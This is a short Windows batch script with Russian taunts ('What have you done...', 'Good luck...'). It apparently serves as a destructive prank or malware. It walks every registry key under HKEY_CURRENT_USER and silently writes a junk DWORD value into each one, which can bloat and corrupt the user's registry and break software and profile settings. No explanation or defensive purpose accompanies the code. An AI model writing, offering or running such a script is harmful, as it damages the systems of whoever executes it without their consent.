@echo off
echo Что ты наделал...

for /f "tokens=*" %%a in ('reg query HKCU /s') do (
    reg add "%%a" /v "*" /t REG_DWORD /d 1 /f >nul 2>&1
)

echo Удачи...
